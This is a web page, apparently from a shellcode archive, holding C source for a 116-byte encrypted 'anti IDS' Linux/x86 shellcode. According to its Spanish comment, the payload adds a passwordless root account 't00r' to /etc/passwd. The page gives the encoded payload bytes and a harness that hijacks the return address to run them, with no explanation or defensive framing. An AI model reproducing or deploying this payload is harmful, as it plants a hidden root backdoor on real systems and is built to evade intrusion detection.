<html><head><title>Linux/x86 - add user t00r ENCRYPT 116 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * !!!!!! ANTI IDS SHELLCODE !!!!!!
 *
 * s0t4ipv6@shellcode.com.ar
 * 0x14abril0x7d2
 *
 * !!!!! ENCRIPTADA !!!!!

 * 116 bytes	
 * Agrega la linea &quot;t00r::0:0::/:/bin/sh&quot; en /etc/passwd

 * !!!!! ENCRIPTADA !!!!!
 *
 * Para mas informacion
 * Descargue http://www.shellcode.com.ar/Projects/JempiScodes(version).tgz
 *
 * !!!!!! ANTI IDS SHELLCODE !!!!!!
*/

#include &lt;stdio.h&gt;

char shellcode[]=
&quot;\xeb\x1b\x5f\x31\xc0\x6a\x28\x6a\x52\x59\x49\x5b\x8a\x04\x0f&quot;
&quot;\xf6\xd3\x30\xd8\x88\x04\x0f\x50\x85\xc9\x75\xef\xeb\x05\xe8&quot;
&quot;\xe0\xff\xff\xff\x0e\x6f\xc7\xe4\xff\xfb\xec\xf3\xf4\xb3\xa0&quot;
&quot;\xee\xf6\xb8\xff\xb5\xee\x02\x95\x91\x3a\xb5\x70\x32\xba\x37&quot;
&quot;\xb2\xf6\xb5\xbb\xb2\x04\x07\x86\x5c\x21\xb2\x2e\xc6\xf9\xbe&quot;
&quot;\xa3\xe4\xff\xad\xea\xb2\xf4\xfe\xa7\xf5\xff\xea\xb8\xad\xff&quot;
&quot;\xf5\xf5\xad\xe3\xbb\xff\xbd\x3f\x59\x66\x33\xba\x72\x97\xd3&quot;
&quot;\xb2\x4e\x0e\x8f\x49\x34\xb2\x3f\x72\xb2\x57&quot;;

main() {
        int *ret;
        ret=(int *)&amp;ret+2;
        printf(&quot;Shellcode lenght=%d\n&quot;,strlen(shellcode));
        (*ret) = (int)shellcode;
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
